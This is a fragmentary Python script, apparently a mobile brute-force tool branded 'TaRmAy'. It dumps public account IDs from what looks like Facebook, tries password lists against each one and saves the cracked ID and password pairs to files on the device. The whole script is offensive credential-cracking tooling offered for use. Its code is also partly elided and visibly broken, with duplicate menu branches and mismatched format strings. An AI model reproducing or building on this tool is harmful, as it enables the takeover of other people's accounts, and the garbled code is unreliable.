...
def menu(my_name,my_id):
	...
	alvino_xy(f'IP[{ip}')
	print('[1] CRACK id PUPLICK')
	
	print('[2] CRACK FILE')
	_____TaRmAy__TaRmAy_____ = input('\n CHOUS ')
	if _____TaRmAy__TaRmAy_____ in ['1']:
		dump_massal()
	elif _____TaRmAy__TaRmAy_____ in ['']:
		error()
	elif _____TaRmAy__TaRmAy_____ in ['2']:
		crack_file()
	elif _____TaRmAy__TaRmAy_____ in ['']:
		result()
	elif _____TaRmAy__TaRmAy_____ in ['']:
		...
		print('_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[')
		exit()
	else:
		print('______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[')
		back()
def error():
	print(f'{k} {x}')
	time.sleep(4)
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('CHAND ID DA ANEY?:'))
	except ValueError:
		print(' ')
		exit()
	if jum<1 or jum>100:
...
def passwrd():
	...
	print('')
	print(f'{h}[TaRmAy🤪]{x} {h}OK/%s {x}'%(okc))
	print(f'{k}________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[RODAN]{x} {k}CP/%s {x}'%(cpc))
	print(f'{m}{x}\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ TaRmAy🤪]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "TaRmAy checkpoint" in po.cookies.get_dict().keys():
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rTaRmAy🤪¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [TaRmAy] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[TaRmAy🤪 ok] ID       : {idf}\n[TaRmAy🤪 ok] PASSWORD : {pw}'
					...
					print('\n')
					statusok = f'[bold green][TaRmAy🤪 ok] ID       : {idf}\n[TaRmAy🤪 ok] PASSWORD : {pw}\n[TaRmAy🤪 ok][/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s TaRmAy☠ %s/%s TaRmAy☠ OK:%s TaRmAy☠ CP:%s TaRmAy☠ %s%s%s TaRmAy☠'%(bi,loop,len(id2),    ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='TaRmAy☠ CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]TaRmAy☠ OK[/bold green]'))
					ok+=1
					break
			else:
				continue
